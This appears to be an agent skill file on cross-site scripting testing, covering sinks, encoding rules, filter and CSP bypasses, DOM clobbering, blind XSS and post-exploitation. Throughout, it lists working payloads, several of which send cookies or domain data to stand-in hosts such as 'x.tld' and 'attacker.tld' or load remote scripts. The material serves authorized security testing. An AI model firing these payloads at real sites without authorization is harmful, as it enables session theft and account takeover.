---
name: xss
description: XSS testing covering reflected, stored, DOM-based, mutation, and blind/OOB vectors with WAF-evasion payloads, DOM clobbering, and CSP bypass techniques
---

# XSS

Cross-site scripting persists because context, parser, and framework edges are complex. Treat every user-influenced string as untrusted until it is strictly encoded for the exact sink and guarded by runtime policy (CSP/Trusted Types).

## Attack Surface

**Types**
- Reflected, stored, and DOM-based XSS across web/mobile/desktop shells

**Contexts**
- HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF

**Frameworks**
- React/Vue/Angular/Svelte sinks, template engines, SSR/ISR

**Defenses to Bypass**
- CSP/Trusted Types, DOMPurify, framework auto-escaping

## Injection Points

**Server Render**
- Templates (Jinja/EJS/Handlebars), SSR frameworks, email/PDF renderers

**Client Render**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, template literals
- `dangerouslySetInnerHTML`, `v-html`, `$sce.trustAsHtml`, Svelte `{@html}`

**URL/DOM**
- `location.hash`/`search`, `document.referrer`, base href, `data-*` attributes

**Events/Handlers**
- `onerror`/`onload`/`onfocus`/`onclick` and `javascript:` URL handlers

**Cross-Context**
- postMessage payloads, WebSocket messages, local/sessionStorage, IndexedDB

**File/Metadata**
- Image/SVG/XML names and EXIF, office documents processed server/client

## Context Encoding Rules

- **HTML text**: encode `< > & " '`
- **Attribute value**: encode `" ' < > &` and ensure attribute quoted; avoid unquoted attributes
- **URL/JS URL**: encode and validate scheme (allowlist https/mailto/tel); disallow javascript/data
- **JS string**: escape quotes, backslashes, newlines; prefer `JSON.stringify`
- **CSS**: avoid injecting into style; sanitize property names/values; beware `url()` and `expression()`
- **SVG/MathML**: treat as active content; many tags execute via onload or animation events

## Key Vulnerabilities

### DOM XSS

**Sources**
- `location.href`/`.hash`/`.search`/`.pathname`, `document.URL`/`.documentURI`/`.referrer`, `window.name`
- `postMessage` data, `history.state`, `sessionStorage`/`localStorage` values, IndexedDB reads
- WebSocket/Server-Sent Event message payloads, Service Worker `postMessage`
- Third-party script config objects and URL query-string libraries that re-parse `location.search`

**Sinks**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`/`.writeln`, `Range.createContextualFragment`
- `setAttribute` on `href`/`src`/`on*` attributes, `element.src`/`iframe.src` with a `javascript:`/`data:` URI
- `location`/`location.href`/`.assign()`/`.replace()` assignment (open-redirect-shaped but same source class)
- `setTimeout`/`setInterval` given a string (not a function reference), `eval`/`Function` constructor
- `document.domain =` assignment, `new Worker`/`importScripts` with a Blob/data URL
- jQuery `.html()`/`.append()`/`.attr()`/`.prepend()` — same sinks, different call shape

**Vulnerable Pattern**
```javascript
const q = new URLSearchParams(location.search).get('q');
results.innerHTML = `<li>${q}</li>`;
```
Exploit: `?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`

**Tracing in Bundles**

Source-to-sink tracing on a minified/bundled app is a grep-and-diff exercise, not a read-through:
- Grep crawled JS (from `reconnaissance/asset_discovery.md`'s Application-Layer Recon phase, or a direct fetch) for sink names first — `innerHTML=`, `.html(`, `document.write`, `dangerouslySetInnerHTML`, `eval(` — then walk backward from each hit to find what feeds it
- Pull source maps (`.map` files, often left deployed — see `information_disclosure`) to de-minify before tracing; without one, rely on consistent short-variable-name patterns around the sink call
- Instrument live in `agent_browser`: monkey-patch the sink (`document.write`, or wrap `Element.prototype` setters) and log the call stack for every write — faster than static tracing for SPA route changes and hydration timing
- Confirm the full source→sink path fires with attacker-controlled data before treating it as more than a lead — a sink call site alone is not a finding

### Mutation XSS

Leverage parser repairs to morph safe-looking markup into executable code (e.g., noscript, malformed tags). This bypasses sanitizers that inspect the input string: the sanitizer sees safe markup, but the browser's HTML parser silently repairs or reinterprets it into something executable once it round-trips through `innerHTML` (serialize → reparse):
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>
<form><button formaction=javascript:alert(1)>
<svg><p><style><img src="</style><img src=x onerror=alert(1)>">
```
Test any sink that reads back its own output (`el.innerHTML = el.innerHTML`, a sanitizer's serialize step, a rich-text editor's normalize pass) — the danger is in the *second* parse, not the first.

### Template Injection

Server or client templates evaluating expressions (AngularJS legacy, Handlebars helpers, lodash templates):
```
{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}
```

### CSP Bypass

- Weak policies: missing nonces/hashes, wildcards, `data:` `blob:` allowed, inline events allowed
- Script gadgets: JSONP endpoints, libraries exposing function constructors
- Import maps or modulepreload lax policies
- Base tag injection to retarget relative script URLs
- Dynamic module import with allowed origins

### Trusted Types Bypass

- Custom policies returning unsanitized strings; abuse policy whitelists
- Sinks not covered by Trusted Types (CSS, URL handlers) and pivot via gadgets

## Bypass Techniques

Filter and WAF evasion is context-specific — match the technique to where the payload lands, not a generic denylist.

### HTML Body

- Tag mangling/nesting: `<scr<script>ipt>alert(1)</scr</script>ipt>`, `<img src=x onerror=alert(1)//>`, malformed tags relying on parser auto-close
- Uncommon executing tags: `<details open ontoggle=alert(1)>`, `<video><source onerror=alert(1)>`, `<marquee onstart=alert(1)>`, `<iframe srcdoc="<script>alert(1)</script>">`
- Case variation: `<ScRiPt>`, `<IMG SRC=x OnErRoR=alert(1)>` — for filters keying on exact-case string match
- Split keywords across a stripped-but-not-rejoined token: `<scr\0ipt>`, or HTML comments a naive regex filter doesn't account for

### Attribute Context

- Quote-breakout with no assumption on quote char: try `"`, `'`, and unquoted (`" autofocus onfocus=alert(1) x="`)
- Whitespace alternatives inside a tag: tab, newline, form-feed often pass a regex expecting only a literal space before an attribute
- Attribute-value entity encoding: `&#x6a;avascript:alert(1)` in `href` — decoded by the HTML parser after a naive substring filter already passed it

### JS String / Template Literal

- Break out of a template literal with `${...}`, or nest backticks: `` `${`${alert(1)}`}` ``
- String-building to dodge keyword denylists: `this['al'+'ert'](1)`, `window[String.fromCharCode(97,108,101,114,116)](1)`
- Unicode escape sequences spelled into an identifier (JS resolves `u0061` after `\` as the letter `a`, etc.) — valid JS, evades a literal `alert` string match since the token never appears as plain text

### URL Context

- `javascript:` case/whitespace variants: `Java\tScript:alert(1)`, `javascript\n:alert(1)` — browsers strip control chars from the scheme before evaluating it
- Alternate schemes with the same effect where the sink renders the URL as a document: `data:text/html,<script>alert(1)</script>` in an `iframe src` or `window.open`
- Double URL-encoding for filters that decode exactly once: `%2561%256c%2565...`

### CSS Context

- Legacy `expression()` (old IE) and `url(javascript:...)`
- `@import` to an attacker-controlled stylesheet when `<style>`/`style=` injection works but `<script>` is stripped

### Encoding Layers (cross-cutting)

- HTML entities — decimal (`&#97;`), hex (`&#x61;`), named — decoded at HTML-parse time, after most naive string filters already ran
- UTF-7: `+ADw-script+AD4-alert(1)+ADw-/script+AD4-` — only fires where the page or client declares/sniffs UTF-7 (rare in modern browsers; still seen in some legacy/embedded renderers, PDF viewers, email clients)
- Unicode normalization: fullwidth/homoglyph characters that normalize back to `<`, `>`, `"` after a filter that only checked the raw form

### DOM Clobbering

Named HTML elements (`id`/`name`) can overwrite global JS variables the page's own script trusts — no script execution needed to *plant* the clobber:
```html
<img name=config>
<img name=config id=url src=//attacker.tld/evil.js>
```
If application code does `if (!window.config) config = {url: 'trusted.js'}` or reads `config.url` expecting a same-origin path, the clobbered `<img>` satisfies the truthy check and its `src` attribute is read as the value — hijacking a script load, redirect target, or trusted-origin check with zero `<script>` tags. High-value against pages that gate behavior on a global identifier's truthiness rather than a strict type check.

## Polyglot Payloads

Keep a compact set tuned per context:
- **HTML node**: `<svg onload=alert(1)>`
- **Attr quoted**: `" autofocus onfocus=alert(1) x="`
- **Attr unquoted**: `onmouseover=alert(1)`
- **JS string**: `"-alert(1)-"`
- **URL**: `javascript:alert(1)`

## Framework-Specific

### React

- Primary sink: `dangerouslySetInnerHTML`
- Secondary: setting event handlers or URLs from untrusted input
- Bypass patterns: unsanitized HTML through libraries; custom renderers using innerHTML

### Vue

- Sinks: `v-html` and dynamic attribute bindings
- SSR hydration mismatches can re-interpret content

### Angular

- Legacy expression injection (pre-1.6)
- `$sce` trust APIs misused to whitelist attacker content

### Svelte

- Sinks: `{@html}` and dynamic attributes

### Markdown/Richtext

- Renderers often allow HTML passthrough; plugins may re-enable raw HTML
- Sanitize post-render; forbid inline HTML or restrict to safe whitelist

## Special Contexts

### Email

- Most clients strip scripts but allow CSS/remote content
- Use CSS/URL tricks only if relevant; avoid assuming JS execution

### PDF and Docs

- PDF engines may execute JS in annotations or links
- Test `javascript:` in links and submit actions

### File Uploads

- SVG/HTML uploads served with `text/html` or `image/svg+xml` can execute inline
- Verify content-type and `Content-Disposition: attachment`
- Mixed MIME and sniffing bypasses; ensure `X-Content-Type-Options: nosniff`

## Blind / Out-of-Band XSS

Payloads that fire later, in a browser you cannot directly observe — an admin reviewing a support ticket, a moderator opening a flagged profile, a log viewer rendering a filename or User-Agent. High value because these contexts routinely carry privileged sessions, and because the injection field itself is often unauthenticated while the trigger is a privileged internal user.

### Where to Inject

Any stored field a human is likely to review, especially outside the attacker's own session:
- Contact/support forms, ticket subject/body, chat widget messages
- Free-text profile fields reviewed by moderation (display name, bio, company)
- `User-Agent`, `Referer`, `X-Forwarded-For` — logged and later rendered in an admin log viewer or analytics dashboard
- Filenames and metadata on uploaded files (see `insecure_file_uploads`) reviewed in an admin file browser
- Order notes, feedback forms, and any field feeding an internal CRM or helpdesk UI
- Any field you cannot see rendered back in your own session — that opacity is itself the signal it may render somewhere privileged

### Payload and Collector

Keep the injected payload minimal and self-contained — it only needs to load a remote script from infrastructure you control:
```html
"><script src=https://COLLECTOR_ID.attacker.tld/x.js></script>
```
The remote `x.js` does the real work: harvest `document.cookie`, `document.domain`, `location.href`, a DOM snapshot, and beacon it back (`fetch`/`sendBeacon` to the same collector — inline exfiltration in the injected string only gets one shot before the payload is gone).

For confirmation-only (no cookie/DOM-capture infrastructure available), a single OOB callback is enough to prove execution: mint a domain with `interactsh-client -v` and inject `<script>fetch('https://xyz.oast.fun/hit')</script>` or `<img src=x onerror="fetch('//xyz.oast.fun/'+document.domain)">` — the DNS/HTTP hit on interactsh's stdout, arriving asynchronously after the stored payload is viewed, is the proof of execution in someone else's browser. Full harvesting (cookies, screenshots, DOM) needs a purpose-built collector (self-hosted XSS-Hunter-style) when authorized and in scope.

### Confirming and Reporting

- The finding is **not** confirmed at injection time — only when the callback fires. Wait a realistic review window (minutes to days, depending on the target's ticket/moderation SLA) before closing it out.
- Record the injection timestamp, the injected payload, and the collector-hit timestamp together — the gap between them is evidence the trigger was a separate, privileged actor, not your own request replaying.
- If the collector reports `document.cookie`/`document.domain`/URL on callback, that's strong evidence of a privileged execution context; a bare network hit with no page data still proves execution but not context — say so explicitly in `confidence_rationale` rather than assuming it fired in the admin panel.
- If no callback ever fires, this is `open_proof_gap` (the field may be reviewed on a longer cycle, or by a process that strips scripts) — not `ruled_out`, unless you can name the specific sanitizer/encoding that neutralizes the stored value.

## Post-Exploitation

- Session/token exfiltration: prefer fetch/XHR over image beacons for reliability
- Real-time control: WebSocket C2 with strict command set
- Persistence: service worker registration; localStorage/script gadget re-injection
- Impact: role hijack, CSRF chaining, internal port scan via fetch, credential phishing overlays

## Testing Methodology

1. **Identify sources** - URL/query/hash/referrer, postMessage, storage, WebSocket, server JSON
2. **Trace to sinks** - Map data flow from source to sink
3. **Classify context** - HTML node, attribute, URL, script block, event handler, JS eval-like, CSS, SVG
4. **Assess defenses** - Output encoding, sanitizer, CSP, Trusted Types, DOMPurify config
5. **Craft payloads** - Minimal payloads per context with encoding/whitespace/casing variants
6. **Multi-channel** - Test across REST, GraphQL, WebSocket, SSE, service workers
7. **Blind candidates** - Any stored field with no self-view path is a blind-XSS candidate; inject an OOB callback and wait for the review cycle

## Validation

1. Provide minimal payload and context (sink type) with before/after DOM or network evidence
2. Demonstrate cross-browser execution where relevant or explain parser-specific behavior
3. Show bypass of stated defenses (sanitizer settings, CSP/Trusted Types) with proof
4. Quantify impact beyond alert: data accessed, action performed, persistence achieved
5. For reflected/stored/DOM XSS, confirm execution in a live browser context (`agent_browser`) — a payload observed in the response body or database is a lead, not a finding, until it actually executes
6. For blind/OOB XSS, confirmation is the collector callback firing, correlated by timestamp to the injection — not an assumption that a privileged user "probably" viewed it

## False Positives

- Reflected content safely encoded in the exact context
- Stored payload persists in the database but renders HTML-escaped everywhere it's displayed — persistence alone is not stored XSS
- A blind/OOB payload with no callback after a realistic review window — record as `open_proof_gap`, not as ruled out or filed
- CSP with nonces/hashes and no inline/event handlers
- Trusted Types enforced on sinks; DOMPurify in strict mode with URI allowlists
- Scriptable contexts disabled (no HTML pass-through, safe URL schemes enforced)

## Impact

- Session hijacking and credential theft
- Account takeover via token exfiltration
- CSRF chaining for state-changing actions
- Malware distribution and phishing
- Persistent compromise via service workers

## Pro Tips

1. Start with context classification, not payload brute force
2. Use DOM instrumentation to log sink usage; it reveals unexpected flows
3. Keep a small, curated payload set per context and iterate with encodings
4. Validate defenses by configuration inspection and negative tests
5. Prefer impact-driven PoCs (exfiltration, CSRF chain) over alert boxes
6. Treat SVG/MathML as first-class active content; test separately
7. Re-run tests under different transports and render paths (SSR vs CSR vs hydration)
8. Test CSP/Trusted Types as features: attempt to violate policy and record the violation reports
9. Rotate/scope collector subdomains per field when running blind XSS so a callback is attributable to the specific injection point that fired
10. Check global-variable truthiness gates (`if (!window.x)`) before assuming a config/flag can't be attacker-influenced — DOM clobbering needs no `<script>` tag at all

## Summary

Context + sink decide execution. Encode for the exact context, verify at runtime with CSP/Trusted Types, and validate every alternative render path. Small payloads with strong evidence beat payload catalogs.
